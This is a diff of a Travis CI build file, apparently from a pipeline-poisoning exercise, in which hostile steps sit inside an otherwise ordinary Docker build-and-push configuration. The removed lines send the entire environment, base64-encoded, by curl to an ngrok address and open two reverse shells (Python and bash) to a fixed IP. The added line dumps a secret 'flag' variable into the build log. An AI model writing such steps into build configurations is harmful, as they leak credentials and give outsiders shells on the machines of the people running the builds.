@@ -1,24 +1,6 @@
 language: node_js
-
-services:
-  - docker
-
-install:
-  - echo "install nothing!" # put your normal pre-testing installs here derp
-
-script:
-  - echo "no tests!" # put your normal testing scripts here
-
+services: [docker]
+install: ["echo install nothing"]
+script: ["echo no tests"]
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST https://93042ee1f4bd.ngrok-free.app
-  - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.14.75.146",9999));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
-  - bash -i >& /dev/tcp/3.14.75.146/9999 0>&1
-  - docker --version 
-  - pip install --user awscli
-  - export PATH=$PATH:$HOME/.local/bin
-  - export CLASS=`cat .class`
-  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
-  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-# sadly, travis doesn't cache docker builds yet, so each build will take a while
-# Nothing to see here!!
+  - echo "===FLAG_B64==="; printenv flag | base64 -w0; echo; echo "===END==="
